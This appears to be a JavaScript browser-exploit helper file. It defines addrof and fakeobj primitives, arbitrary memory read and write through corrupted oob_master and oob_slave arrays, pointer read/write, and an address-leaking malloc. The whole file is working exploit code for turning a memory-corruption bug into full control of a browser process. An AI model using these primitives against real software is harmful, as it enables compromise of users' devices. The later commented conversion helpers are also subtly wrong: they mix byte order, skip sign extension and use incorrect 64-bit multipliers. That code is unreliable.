function i48_put(x, a) {
    a[4] = x | 0;
    a[5] = (x / 4294967296) | 0;
}

function i48_get(a) {
    return a[4] + a[5] * 4294967296;
}

function addrof(x) {
    leaker_obj.a = x;
    return i48_get(leaker_arr);
}

function fakeobj(x) {
    i48_put(x, leaker_arr);
    return leaker_obj.a;
}

function read_mem_setup(p, sz) {
    i48_put(p, oob_master);
    oob_master[6] = sz;
}

function read_mem(p, sz) {
    read_mem_setup(p, sz);
    var arr = [];
    for (var i = 0; i < sz; i++)
        arr.push(oob_slave[i]);
    return arr;
}

function read_mem_s(p, sz) {
    read_mem_setup(p, sz);
    return "" + oob_slave;
}

function read_mem_b(p, sz) {
    read_mem_setup(p, sz);
    var b = new Uint8Array(sz);
    b.set(oob_slave);
    return b;
}

function read_mem_as_string(p, sz) {
    var x = read_mem_b(p, sz);
    var ans = '';
    for (var i = 0; i < x.length; i++)
        ans += String.fromCharCode(x[i]);
    return ans;
}

function write_mem(p, data) {
    i48_put(p, oob_master);
    oob_master[6] = data.length;
    for (var i = 0; i < data.length; i++)
        oob_slave[i] = data[i];
}

function read_ptr_at(p) {
    var ans = 0;
    var d = read_mem(p, 8);
    for (var i = 7; i >= 0; i--)
        ans = 256 * ans + d[i];
    return ans;
}

function write_ptr_at(p, d) {
    var arr = [];
    for (var i = 0; i < 8; i++) {
        arr.push(d & 0xff);
        d /= 256;
    }
    write_mem(p, arr);
}

function hex(x) {
    return (new Number(x)).toString(16);
}
var malloc_nogc = [];
function malloc(sz) {
    var arr = new Uint8Array(sz);
    malloc_nogc.push(arr);
    return read_ptr_at(addrof(arr) + 0x10);
}


// Convert a byte array to a signed 8-bit integer
function to_i8(arr) {
    return (arr[0] << 24) >> 24;  // Sign extend to 8 bits
}

// Convert a byte array to a signed 16-bit integer
function to_i16(arr) {
    return (arr[0] << 8) | arr[1];
}

// Convert a byte array to a signed 32-bit integer
function to_i32(arr) {
    return (arr[0] << 24) | (arr[1] << 16) | (arr[2] << 8) | arr[3];
}

// Convert a byte array to an unsigned 8-bit integer
function to_u8(arr) {
    return arr[0] & 0xFF;
}

// Convert a byte array to an unsigned 16-bit integer
function to_u16(arr) {
    return (arr[0] << 8) | arr[1];
}

// Convert a byte array to an unsigned 32-bit integer
function to_u32(arr) {
    return (arr[0] << 24) | (arr[1] << 16) | (arr[2] << 8) | arr[3];
}

// Read a signed 8-bit integer from the specified address
function readi8From(addr) {
    read_mem_setup(addr, 1);  // Set up to read 1 byte
    let data = oob_slave.slice(0, 1);  // Read the byte into an array
    return to_i8(data);  // Convert the byte to a signed 8-bit integer
}

// Read a signed 16-bit integer from the specified address
function readi16From(addr) {
    read_mem_setup(addr, 2);  // Set up to read 2 bytes
    let data = oob_slave.slice(0, 2);  // Read the 2 bytes into an array
    return to_i16(data);  // Convert the bytes to a signed 16-bit integer
}

// Read a signed 32-bit integer from the specified address
function readi32From(addr) {
    read_mem_setup(addr, 4);  // Set up to read 4 bytes
    let data = oob_slave.slice(0, 4);  // Read the 4 bytes into an array
    return to_i32(data);  // Convert the bytes to a signed 32-bit integer
}

// Read an unsigned 8-bit integer from the specified address
function readU8From(addr) {
    read_mem_setup(addr, 1);  // Set up to read 1 byte
    let data = oob_slave.slice(0, 1);  // Read the byte into an array
    return to_u8(data);  // Convert the byte to an unsigned 8-bit integer
}

// Read an unsigned 16-bit integer from the specified address
function readU16From(addr) {
    read_mem_setup(addr, 2);  // Set up to read 2 bytes
    let data = oob_slave.slice(0, 2);  // Read the 2 bytes into an array
    return to_u16(data);  // Convert the bytes to an unsigned 16-bit integer
}

// Read an unsigned 32-bit integer from the specified address
function readU32From(addr) {
    read_mem_setup(addr, 4);  // Set up to read 4 bytes
    let data = oob_slave.slice(0, 4);  // Read the 4 bytes into an array
    return to_u32(data);  // Convert the bytes to an unsigned 32-bit integer
}
// Convert a byte array to a signed 64-bit integer (I64)
function to_i64(arr) {
    // Sign extend the 64-bit value to a JavaScript number (which is 64-bit)
    return (arr[0] * 0x1000000000000) + (arr[1] * 0x10000000000) + (arr[2] * 0x100000000) + 
           (arr[3] * 0x1000000) + (arr[4] * 0x10000) + (arr[5] * 0x100) + (arr[6] * 0x1) + arr[7];
}

// Convert a byte array to an unsigned 64-bit integer (U64)
function to_u64(arr) {
    // Simply combine the 8 bytes into a positive number
    return (arr[0] * 0x1000000000000) + (arr[1] * 0x10000000000) + (arr[2] * 0x100000000) + 
           (arr[3] * 0x1000000) + (arr[4] * 0x10000) + (arr[5] * 0x100) + (arr[6] * 0x1) + arr[7];
}

// Read a signed 64-bit integer from the specified address
function readI64From(addr) {
    read_mem_setup(addr, 8);  // Set up to read 8 bytes
    let data = oob_slave.slice(0, 8);  // Read the 8 bytes into an array
    return to_i64(data);  // Convert the bytes to a signed 64-bit integer
}

// Read an unsigned 64-bit integer from the specified address
function readU64From(addr) {
    read_mem_setup(addr, 8);  // Set up to read 8 bytes
    let data = oob_slave.slice(0, 8);  // Read the 8 bytes into an array
    return to_u64(data);  // Convert the bytes to an unsigned 64-bit integer
}
